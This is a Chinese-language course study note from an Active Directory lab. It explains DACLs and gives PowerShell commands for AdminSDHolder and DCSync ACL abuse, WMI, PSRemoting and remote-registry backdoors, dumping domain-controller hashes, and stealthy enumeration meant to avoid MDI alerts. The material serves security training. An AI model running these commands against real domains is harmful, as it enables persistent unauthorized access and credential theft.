<td>GROUP-A</td>
<td>GROUP-A</td>
</tr>
<tr>
<td>GROUP-B</td>
<td></td>
</tr>
<tr>
<td>GROUP-C</td>
<td></td>
</tr>
</tbody></table>
<p>他们都要访问一个 <code>对象</code></p>
<p>而这个对象 <code>DACL</code> 中的权限如下</p>
<p><code>Object</code></p>
<table>
<thead>
<tr>
<th>ACE1</th>
<th>ACE2</th>
<th>ACE3</th>
</tr>
</thead>
<tbody><tr>
<td>Access denied</td>
<td>Access allowed</td>
<td>Access allowed</td>
</tr>
<tr>
<td>Andrew</td>
<td>GROUP-A</td>
<td>Everyone</td>
</tr>
<tr>
<td>Read,Write,execute</td>
<td>Write</td>
<td>Read,execute</td>
</tr>
</tbody></table>
<p>因为 <code>拒绝</code> ACL优先级更高</p>
<p>因此 <code>A用户</code> 试图执行、写入、查看 <code>Object</code> 将会禁止访问 <code>Access denied</code></p>
<p>而 <code>B用户</code> 将拥有，<code>ACE2</code> <code>GROUP-A</code>的 <code>write</code> 权限， <code>ACE3</code> <code>Everyone</code>的<code>Read</code>、<code>execute</code> 权限。</p>
<h3 id="2-ACL权限利用"><a href="#2-ACL权限利用" class="headerlink" title="2.ACL权限利用"></a>2.ACL权限利用</h3><p>当对 <code>域管理员组</code> 有 <code>控制</code> 权限时，最好的做法不是给 <code>域管理员组</code> 添加一个用户，而是给一个账户添加对 <code>域管理员组</code> 的 <code>完全控制</code> 权限 ，但同时需要注意，每隔一小时都会有一个 <code>SD持有人</code> 的特殊容器会覆盖掉域内 <code>受保护</code> 的 <code>高价值账户或组</code> 的 <code>ACL</code></p>
<h3 id="3-枚举收集域内ACL"><a href="#3-枚举收集域内ACL" class="headerlink" title="3.枚举收集域内ACL"></a>3.枚举收集域内ACL</h3><p>枚举域内对于 <code>student1</code> 账户的权限</p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomianObjectACL -SamAccountName student1 -ResolveGUIDS</span><br></pre></td></tr></table></figure>

<p>基于ldap筛选，枚举域内针对于 <code>Domian admin</code> <code>CN</code> 的 <code>ACL</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianObjectACL</span> <span class="literal">-SearchBase</span> <span class="string">&quot;ldap://CN=Domian Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&#x27;ad:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span>).Access</span><br></pre></td></tr></table></figure>

<p>列出相对有价值的权限</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-InterestingDomainAcl</span> <span class="literal">-ResolveGUIDs</span></span><br></pre></td></tr></table></figure>

<p>获取与指定路径相关的ACL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-PathAcl -Path &#x27;\\dcorp-dc.dollarcorp.moneycorp.local\&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="4-AdminSDHolder"><a href="#4-AdminSDHolder" class="headerlink" title="4.AdminSDHolder"></a>4.AdminSDHolder</h3><p>安全描述符持有者是一个容器，他包含一个ACL列表，会有一个进程每过一小时读取这个acl列表，并将这个ACL其覆盖掉ACL每个受保护对象（组&#x2F;用户）。</p>
<p>因此对受保护组或成员的acl做出的任何修改都将会在一小时后被 <code>AdminSDHolder</code> 的ACL重置。</p>
<h4 id="01-利用AdminSD"><a href="#01-利用AdminSD" class="headerlink" title="01.利用AdminSD"></a>01.利用AdminSD</h4><p>只需要对 <code>AdminSDHolder</code> 添加当前用户的 <code>完全控制</code> 权限，之后adminSD的同步时候便会将当前用户的 <code>完全控制</code> 权限会自动同步应用到所有被保护的组中。</p>
<p>对 <code>AdminSDHolder</code> 操作的任何acl，都会同步至受保护的对象的 <code>ACL</code>。</p>
<p>添加之后，即便从域管组中即便删除了当前用户的权限，每次同步acl都会重新覆盖掉acl。</p>
<p>做法有两种：</p>
<p>1.powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-DomianObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,dc=moneycorp,dc=local&#x27;</span> <span class="literal">-PrincipalIdentity</span> Student1 <span class="literal">-Right</span> All <span class="literal">-principalDomian</span> dollarcorp.moneycorp.local <span class="literal">-TargetDomian</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>2.RACE</p>
<p>需要DA权限</p>
<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/RACE">https://github.com/samratashok/RACE</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DCPermissions</span> <span class="literal">-Method</span> AdminSDHolder <span class="literal">-SAMAccountNAME</span> student1 <span class="literal">-Right</span> GenricAll <span class="literal">-DistinguishName</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="02-加载脚本手动触发adminSD同步"><a href="#02-加载脚本手动触发adminSD同步" class="headerlink" title="02.加载脚本手动触发adminSD同步"></a>02.加载脚本手动触发adminSD同步</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sess</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ConputerName</span> dcorp<span class="literal">-dc</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-FilePath</span> <span class="string">&quot;C:\tools\Invoke-SDPropagator.ps1&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$sess</span> <span class="literal">-scriptblock</span> &#123;<span class="built_in">Invoke-SDPropagator</span> <span class="literal">-showProgress</span> <span class="literal">-Verbose</span> <span class="literal">-timeoutMinutes</span> <span class="number">1</span>&#125; </span><br></pre></td></tr></table></figure>

<p>2008的话用这个</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SDPropagator</span> <span class="literal">-taskname</span> FixUpInheritancetimeoutMinutes <span class="number">1</span><span class="literal">-showProgress</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="03-如何防范"><a href="#03-如何防范" class="headerlink" title="03.如何防范"></a>03.如何防范</h4><p>除了保护好域管理员之外，还应当对adminSDHolder 开启日志审计。</p>
<h3 id="5-权限修改、添加等（命令样例）"><a href="#5-权限修改、添加等（命令样例）" class="headerlink" title="5.权限修改、添加等（命令样例）"></a>5.权限修改、添加等（命令样例）</h3><p>添加对 <code>AdminSDHolder</code> 的 <code>ResetPassword</code>权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-DomianObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-printcipalIdentity</span> student1 <span class="literal">-Rights</span> ResetPassword <span class="literal">-PrincipalDomian</span> dollarcorp.moneycorp.local <span class="literal">-TargetDomian</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>添加对 <code>AdminSDHolder</code> 的 <code>writeMembers</code>权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">add-DomianObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&#x27;CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="literal">-printcipalIdentity</span> student1 <span class="literal">-Rights</span> writeMembers <span class="literal">-PrincipalDomian</span> dollarcorp.moneycorp.local <span class="literal">-TargetDomian</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>重置testda用户密码</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomianUserPassword</span> <span class="literal">-Identity</span> testda <span class="literal">-AccountPassword</span> (<span class="built_in">ConvertTo-Securestring</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>


<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADAccountPassword</span> <span class="literal">-Identity</span> testda <span class="literal">-NewPassword</span> (<span class="built_in">ConvertTo-Securestring</span> <span class="string">&quot;Password@123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>检查student1对Domian admins的权限</p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -Identity &#x27;Domain Admins&#x27; -ResolveGUIDs |ForEach-Object &#123;$_ | Add-Member NoteProperty &#x27;IdentityName&#x27; $(Convert-SidToName $_.securityIdentifier);$_ &#125; | ?&#123; $_.IdentityName -match &quot;student1&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>AD moduel</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="literal">-Path</span> <span class="string">&#x27;AD:\CN=Domian Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span>).Access | ?&#123;<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&quot;student1&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>添加对域的DCSync权限，这里涉及到两个权限 <code>Replicating Diretory changes</code> 和 <code>Replicating Diretory changes ALL</code></strong></p>
<p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-domianobjectACL -TargetIdentity &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; -principalIdentity student1 -Rights DSCync -PrincipalDomian dollarcorp.moneycorp.local -TargetDomian dollarcorp.moneycorp.local -Verbose</span><br></pre></td></tr></table></figure>

<p>RACE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-ADACL  -SamAccountName Student1 -DistinguishedName &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; -GUIDRight Dcsync -Verbose</span><br></pre></td></tr></table></figure>

<h3 id="6-基于ACL利用的访问持久化"><a href="#6-基于ACL利用的访问持久化" class="headerlink" title="6.基于ACL利用的访问持久化"></a>6.基于ACL利用的访问持久化</h3><p>在有管理访问权限的机器上，通过修改某些 <code>acl</code> 满足以无需管理权限便允许通过WMI或远程注册表访问机器，通常这些访问方式需要有机器的管理权限才可使用。</p>
<p>这些ACL通常是SDDL编写（安全描述符定义语言）</p>
<p>安全描述符（SDDL）使用ACE形式来表示 DACL 和 SACL 如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid</span><br></pre></td></tr></table></figure>

<p>比如 <code>administrator</code> 在WMI命名空间的 <code>ACE</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A;CI;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-32-544</span><br></pre></td></tr></table></figure>

<p>如下</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><strong>A</strong></td>
<td>Allow</td>
<td>允许访问</td>
</tr>
<tr>
<td><strong>CI</strong></td>
<td>Container Inherit</td>
<td>可被子对象继承</td>
</tr>
<tr>
<td><strong>CCDCLCSWRPWPDTLOSDRCWDWO</strong></td>
<td>权限</td>
<td>多个权限位</td>
</tr>
<tr>
<td><strong>空</strong></td>
<td>对象 GUID</td>
<td>不限定</td>
</tr>
<tr>
<td><strong>空</strong></td>
<td>继承 GUID</td>
<td>不限定</td>
</tr>
<tr>
<td><strong>S-1-5-32-544</strong></td>
<td>SID</td>
<td>本地组：<strong>Administrators</strong></td>
</tr>
</tbody></table>
<p>要利用这个，可以用当前所控制账户的SID 拿管理员对应的这条ACE搞过来，并指定后面的SID到目标用户，便可以得到相同权限。</p>
<h4 id="WMI的ACL修改"><a href="#WMI的ACL修改" class="headerlink" title="WMI的ACL修改"></a>WMI的ACL修改</h4><p>当使用WMI的时候有两个地方会检查权限，一个是DCOM，一个是wmi命名空间（检查是否有权限连接到DCOM端点）</p>
<p>这里直接用RACE，对WMI进行操作，注意修改这些部分需要admin权限。</p>
<p>在本地执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotewMI</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>在远程主机执行（使用当前用户凭据）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemoteWMI</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>使用其他用户凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemoteWMI</span>  <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-credential</span> Administrator <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>远程删除对应权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotewMI</span> <span class="literal">-SamAccountName</span> student1  <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Remove</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>有权限后可以验证一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gwmi -class win32_operatingsystem -ComputerName dcorp-dc</span><br></pre></td></tr></table></figure>

<h4 id="Powershell远程的ACL修改"><a href="#Powershell远程的ACL修改" class="headerlink" title="Powershell远程的ACL修改"></a>Powershell远程的ACL修改</h4><p>正常情况下需要有被远程连接主机的本地管理员权限才可以使用<code>Enter-PSSession</code></p>
<p>同样可以通过RACE脚本来操作</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>在远程主机执行（在当前进程账户权限足够的情况下，使用当前用户凭据）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>使用其他用户凭据(当前权限不够的情况下，用权限足够的账户)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span>  <span class="literal">-SamAccountName</span> student1 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-credential</span> Administrator <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>远程删除对应权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-RemotePSRemoting</span> <span class="literal">-SamAccountName</span> student1  <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Remove</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<h4 id="远程注册表权限"><a href="#远程注册表权限" class="headerlink" title="远程注册表权限"></a>远程注册表权限</h4><p>为用户student1添加远程注册表的访问权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-RemoteRegBackdoor</span> <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-Trustee</span> student1 <span class="literal">-verpose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc机器帐户哈希</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-RemoteMachineAccountHash</span> <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc的本地账户哈希（包含administrator等账户）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-RemoteLocalAccountHash</span> <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>作为student1 检索dcorp-dc的域缓存凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Remotecachedcredential</span><span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>这里留这个后门，为了方便后续低权用户拿到DC的机器hash伪造银票力，做持久维权（桀桀桀</p>
<h2 id="02-domain-enumeration"><a href="#02-domain-enumeration" class="headerlink" title="02 domain enumeration"></a>02 domain enumeration</h2><h3 id="1-可能会有域用户的-description（描述）属性被写了明文敏感信息"><a href="#1-可能会有域用户的-description（描述）属性被写了明文敏感信息" class="headerlink" title="1.可能会有域用户的 description（描述）属性被写了明文敏感信息"></a>1.可能会有域用户的 <code>description</code>（描述）属性被写了明文敏感信息</h3><p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get_DomainUser -LDAPFilter &#x27;Description=*built*&#x27;|Select name,Description</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser -Filter &#x27;Description -like &quot;*built*&quot;&#x27; -Properties Description |select name,Description </span><br></pre></td></tr></table></figure>

<h3 id="2-找到域内实际使用的机器，可以通过登录次数来判断"><a href="#2-找到域内实际使用的机器，可以通过登录次数来判断" class="headerlink" title="2.找到域内实际使用的机器，可以通过登录次数来判断"></a>2.找到域内实际使用的机器，可以通过登录次数来判断</h3><p>powerview</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer | select dnshostname</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer | select dnshostname,logonCount</span><br></pre></td></tr></table></figure>

<h3 id="3-枚举组"><a href="#3-枚举组" class="headerlink" title="3.枚举组"></a>3.枚举组</h3><p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianGroup</span></span><br></pre></td></tr></table></figure>

<p>通过组名来寻找包含关键字的组 （以admin关键字为例）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGroup</span> *admin*</span><br></pre></td></tr></table></figure>

<p>如果像这样查询，会发现没有 <code>企业管理员</code>(Enterprise Admins) </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianGroup</span> *admin* | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<p>而当向域来请求时，将会看到企业管理员组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGroup</span> *admin* <span class="literal">--Domain</span> moneycorp.local | <span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<p>企业管理员存在于根域中，允许访问所有的域控制器<br>而子域的域管理员可能无法直接访问到dc，这还需要再进行移动。</p>
<h3 id="sid是唯一标识，无法出现俩相同的"><a href="#sid是唯一标识，无法出现俩相同的" class="headerlink" title="sid是唯一标识，无法出现俩相同的"></a>sid是唯一标识，无法出现俩相同的</h3><p>500-1000 是预留的</p>
<h3 id="如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在-19-和-20-节课中学到）"><a href="#如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在-19-和-20-节课中学到）" class="headerlink" title="如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）"></a>如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</h3><h3 id="4-枚举域管理员组人员"><a href="#4-枚举域管理员组人员" class="headerlink" title="4.枚举域管理员组人员"></a>4.枚举域管理员组人员</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomianGroupMember -Identity &quot;Domian Admins&quot; -Recure</span><br></pre></td></tr></table></figure>

<h3 id="5-通过用户名枚举用户所属组"><a href="#5-通过用户名枚举用户所属组" class="headerlink" title="5.通过用户名枚举用户所属组"></a>5.通过用户名枚举用户所属组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomianGroupMember -Username &quot;student1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="6-列出本地-组-或-组成员"><a href="#6-列出本地-组-或-组成员" class="headerlink" title="6.列出本地 组 或 组成员"></a>6.列出本地 组 或 组成员</h3><p>需要注意，dc是一台特殊的机器，在dc列出本地组、组成员不需要特殊权限</p>
<p>而在其他成员机器上列出本地组、组成员，则需要administrator权限</p>
<p>列出机器上的本地组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroup -computerName dcorp-dc</span><br></pre></td></tr></table></figure>

<p>列出机器上指定组的 组成员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators</span><br></pre></td></tr></table></figure>

<h3 id="7-枚举-smbshare"><a href="#7-枚举-smbshare" class="headerlink" title="7.枚举 smbshare"></a>7.枚举 smbshare</h3><p>获取当前host的share</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ShareFinder -verbose</span><br></pre></td></tr></table></figure>

<p>获取当前域名中的敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-FileFinder -verbose</span><br></pre></td></tr></table></figure>

<p>获取域中所有文件服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetFileserver</span><br></pre></td></tr></table></figure>

<p>枚举共享这部分，阿三推荐了</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/NetSPl/PowerHuntShares">https://github.com/NetSPl/PowerHuntShares</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-HuntsMBShares -NoPing -outputDirectory C:\AD\Tools -HostList C:AD\Tools\servers.txt</span><br></pre></td></tr></table></figure>

<p>从opsec角度来看，阿三不建议把域控加入到扫描的 <code>servers.txt</code> 中，因为：如果枚举一个配置了MDI的域控，那域控会直接告警</p>
<p>快速创建和留下连接日志为4624、4634</p>
<h3 id="8-bloodhound遛狗"><a href="#8-bloodhound遛狗" class="headerlink" title="8.bloodhound遛狗"></a>8.bloodhound遛狗</h3><p>遛狗基于opensec角度来看，<code>-c ALL</code> 因为 <code>smb</code> 和 <code>ldap</code> 等对DC发起的请求有很大概率被mdi直接告警。</p>
<p>所以这里阿三建议手动指定扫描的方法 ，并且排除dc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Group,GPoLocalGroup,Session,Trusts,AcL,container,objectProps,SPNTargets,CertServices   --excludedcs</span><br></pre></td></tr></table></figure>

<h3 id="9-SOAPHound"><a href="#9-SOAPHound" class="headerlink" title="9.SOAPHound"></a>9.SOAPHound</h3><p>SOAPHound并非使用ADDS，而是使用ADWS（active directory web）走9389端口来交互，这样就不走LDAP了。</p>
<p>使用方式如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SOAPHound.exe <span class="literal">--buildcache</span> <span class="literal">-c</span> <span class="string">&quot;C:\path\cache.txt&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>联动bloodhound的方式，这个SOAPHound支持转换为bloodhound的形式</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SOAPHound.exe <span class="literal">-c</span> <span class="string">&quot;C:\path\cache.txt&quot;</span> <span class="literal">--bhdump</span> <span class="literal">-o</span> <span class="string">&quot;C:\path\bloodhound-output&quot;</span> <span class="literal">--nolaps</span></span><br></pre></td></tr></table></figure>

<h3 id="10-域会话（session）枚举"><a href="#10-域会话（session）枚举" class="headerlink" title="10.域会话（session）枚举"></a>10.域会话（session）枚举</h3><p>(在大于等于2019版本时，需要本地管理员才可以列出session)</p>
<p>可以使用这个，他不需要远程的管理员权限也可以枚举session,它使用远程注册表查看 <code>HKEY_USERS</code> 的 <code>hive</code></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Leo4j/Invoke-SessionHunter">https://github.com/Leo4j/Invoke-SessionHunter</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SessionHunter</span> <span class="literal">-Failsafe</span></span><br></pre></td></tr></table></figure>

<p>站在opsec角度来看，为了避免触发DC的MDI，同样，采用列表查询的方式，剔除掉其中的DC</p>
<p>在枚举域机器上的session时 <code>Invoke-SessionHunter</code> 会更加实用一些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SessionHunter</span> <span class="literal">-NoPortScan</span> <span class="literal">-Targets</span> <span class="string">&quot;C:\servers.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p>查找 <code>domian admin</code> 或者其他 <code>指定组</code> &#x2F; <code>用户</code> 存在session的机器，需要注意这个脚本是要在被查找得那台机器上有管理员权限才可以查看到。</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-DomianUserLocation</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>查询指定的组&#x2F;用户存在session的机器</p>
